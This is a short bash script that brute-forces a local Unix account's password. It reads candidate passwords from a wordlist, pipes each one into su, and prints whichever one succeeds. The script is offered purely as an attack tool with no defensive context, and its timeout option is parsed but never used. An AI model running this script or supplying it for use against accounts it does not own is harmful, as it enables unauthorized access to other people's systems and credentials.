#!/bin/bash

while getopts u:w:t: flag
do
    case "${flag}" in
        u) username=${OPTARG};;
        w) wordlist=${OPTARG};;
        t) timeout=${OPTARG};;
    esac
done
echo "Bruteforcing $username...! Please wait #_#"
while IFS= read -r password; do
    if echo $password | su $username &> /dev/null; then
    echo "Password is $password"
    exit 0
fi
done < "$wordlist"

echo "No password!"
exit 1
